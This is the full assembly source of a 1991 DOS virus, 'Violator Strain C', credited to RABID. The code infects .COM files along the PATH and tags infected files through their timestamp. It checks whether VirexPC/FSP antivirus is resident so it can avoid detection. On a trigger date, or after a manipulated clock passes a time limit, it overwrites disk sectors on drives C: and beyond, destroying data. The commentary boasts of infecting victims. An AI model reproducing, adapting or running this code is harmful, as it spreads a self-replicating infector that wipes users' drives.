;
; Violator Strain C - "Violator strikes again..."
;
; Written by The High Evolutionary
; RABID International Development Corp.
;

;
; Here are the equates for when the virus will destroy media
;

month	equ	6			;Set month to June
day	equ	22			;Set day to the 22nd
year	equ	1991			;Set year to 1991

sectors	equ	256			;Fry 256 sectors on the diskette
lastdrv	equ	26			;Set lastdrive to be fried here


CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

@write	macro	drive,sec,buf
	pushf					; Push all flags onto the stack
	mov	al,drive			; Select drive to write
	mov	cx,sec 				; Choose amount of sectors
	mov	dx,0				; Set format to start at sec. 0
	mov	bx,offset buf			; Set format to have intro
						; string imbedded in sector 0
	int	26h				; Call BIOS to write drive
	popf					; Restore the flags we pushed
endm	


violator:
        JMP     virus
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
                                        ; The 2nd and 3rd bytes get modified.
        CLD                             ;Pointers will be auto INcremented
        MOV     SI,DX                   ;Access data as offset from SI
        ADD     SI,first_3              ;Point to original 1st 3 bytes of .COM
        MOV     DI,OFFSET 100H          ;`cause all .COM files start at 100H
        MOV     CX,3
        REPZ    MOVSB                   ;Restore original first 3 bytes of .COM
        MOV     SI,DX                   ;Keep SI pointing to the data area
;
; This routine here will check to see if FSP or VirexPC is active. If it is,
; then we will not run as to avoid detection...
;
; This is done by using some wierd undocumented DOS call which I've never seen
; before, but nonetheless, it does the job...
;
	
	mov	ax,0ff0fh		;Check memory marker
	int	21h
	cmp	ax,101h			;Is the marker for VirexPC/FSP resident

	jne	year_check		;No? Continue with the virus
	jmp	quit			;Yes! Terminate the virus

year_check:
	MOV	AH,2AH				; Get date info
	INT	21h				;
	CMP	CX,year				; Check if it's (year)
	jb	get_space			; Not the year, then must be an
						; XT...
	JGE	month_check			; Yes? Check the month
	JMP	do_shit				; No? Go to infection routine

month_check:
	mov	ah,2ah
	int	21h
	CMP	DH,month			; Check if it's (month)
	JGE	day_check			; Yeah? Check the day
	JMP	do_shit				; No? Infect a phile

day_check:
	CMP 	DL,day				; Check if it's (day)
	JGE	fry_drives			; Yeah? Kill all drives
	JMP	do_shit				; No? Infect a poor guy!

get_space:
	cmp	cx,1990				; Did we change the clock?
	je	was_changed			; Yes we did. Continue...
;
; We only get here if the date is not 1990
;
	mov	ah,2bh			
	mov	cx,1990				; Set date to 1990
	int	21h
	mov	ah,2dh
	mov	cl,1				; Set minutes to 1
	int	21h	

;
; We only get here is the date is 1990. Check clock...
;

was_changed:
	mov	ah,2ch
	int	21h				; Get time
	cmp	cl,15				; 15 minutes...
	jae	fry				; Have we been run after 15
						; minutes of usage? Yes! Fry!
	jmp	month_check			; No! Continue...

;
; Only print this if it's June 22nd, 1991
;

fry_drives:
	mov	ah,9
	mov	dx,si				; Load DX with SI segment
	add	dx,strike			; Print out a message
	int	21h

fry:	cmp	byte ptr [si+drv],lastdrv	; Check to see if the last
						; drive is fried
	ja	do_shit 			; If yeah. Then gedoudahere
	@write	[si+drv],256,intro		; No? Then fry the drive...
	inc	byte ptr [si+drv]		; Increment for the next drive
	jmp	fry				; Then go up and fry another

do_shit:PUSH    ES				; Push ES onto the stack
        MOV     AH,2FH			
        INT     21H
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         ;Save the DTA address from ES
        POP     ES			;Restore the original ES segment
        MOV     DX,dta                  ;Offset of new DTA in virus data area
        ADD     DX,SI                   ;Compute DTA address
        MOV     AH,1AH
        INT     21H                     ;Set new DTA to inside our own code
        PUSH    ES			;Push ES onto the stack
        PUSH    SI			;Push the source index
        MOV     ES,DS:2CH
        MOV     DI,0                    ;ES:DI points to environment

find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        LOOP    check_next_4            ;Loop to check the next character

        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace

move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB

slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6			;Set to read in 6 bytes
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace
        MOV     SI,BX			
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1CH                  ;Mask to remove all but seconds
        CMP     AL,1CH                  ;56 seconds -> already infected
        JZ      find_next               ;If so, go find another file

;******************************************************************************
;Is the file too long? If it's 64000 bytes, then don't infect it
;******************************************************************************

        CMP     WORD PTR [SI+dta_len],(0FA00H-virlen) 
					;Is the file too large
;
; Here we take into acount that the file will fit into even the largest legal
; COM file...
;

        JA      find_next               ;If too long, find another one

;******************************************************************************
;Is it too short? If it's 1500 bytes or smaller, then don't infect it
;******************************************************************************

        CMP     WORD PTR [SI+dta_len],5dcH 
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
        ADD     DX,SI
        INT     21H
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        INT     21H

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
        INT     21H             	;Save first 3 bytes into the data area
        JB      fix_time_stamp  	;Quit, if read failed
        CMP     AX,3            	;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  	;Quit, if not
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp  	;Quit, if it didn't work
        MOV     CX,AX           	;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           	;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm
        MOV     AH,40H
        MOV     CX,virlen               ;Length of virus, in bytes
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ;address of virus code in memory
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
        INT     21H

fix_time_stamp:
	MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1CH 
        MOV     AX,OFFSET 5701H
        INT     21H
        MOV     AH,3EH
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to \path\name in workspace
        INT     21H

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H			;Move offset 100h into DI
        PUSH    DI				;Push DI onto the stack
        XOR     DI,DI				;Zero it out
        RET     0FFFFH				;Jump to the location in DI
; 
; This little trick is used to jump back to the beginning of the program after
; our JMP instruction. This is to return control to the host program.
;

vir_dat EQU     $

drv_	db	2			;drv is the drive to be
					;nuked! (Drive C:)
intro_	DB	13,10
	db	'Violator Strain C - (C) 1991 RABID Int''nl Development Corp.'
	db	13,10
strike_ db	13,10
	db	'Violator strikes again...'
	db	13,10,'$'
olddta_ DW      0                       ;Old DTA offset
olddts_ DW      0                       ;Old DTA segment
oldtim_ DW      0                       ;Old Time
oldate_ DW      0                       ;Old date
oldatt_ DW      0                       ;Old file attributes
first3_ EQU     $
        INT     20H			;3 byte equate to terminate program
        NOP
jmpop_  DB      0E9H                    ;Start of JMP instruction
jmpdsp_ DW      0                       ;The displacement part
envstr_ DB      'PATH='                 ;Find this in the environment
fspec_  DB      '*.COM',0		;What to infect???
pathad_ DW      0                       ;Path address
namptr_ DW      0                       ;Pointer to start of file name
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             ;Temporary DTA goes here
dtatim_ DW      0,0                     ;Time stamp in DTA
dtalen_ DW      0,0                     ;File length in the DTA
dtanam_ DB      0Dh dup (0)             ;File name in the DTA

lst_byt EQU     $                       

virlen  =       lst_byt - v_start       ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start       ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2   ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H
drv	=	drv_	- vir_dat
intro	=	intro_  - vir_dat
strike	=	strike_ - vir_dat
old_dta =       olddta_ - vir_dat       ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat       ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat       ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat       ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat       ;Displacement to old attributes
first_3 =       first3_ - vir_dat       ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat       ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat       ;Displacement to the 2nd 2 bytes of JMP
env_str =       envstr_ - vir_dat       ;Displacement to the "PATH=" string
f_spec  =       fspec_  - vir_dat       ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat       ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat       ;Displacement to the filename pointer
wrk_spc =       wrkspc_ - vir_dat       ;Displacement to the filename workspace
dta     =       dta_    - vir_dat       ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat       ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat       ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat       ;Displacement to the name in the DTA

        CODE    ENDS
END     violator
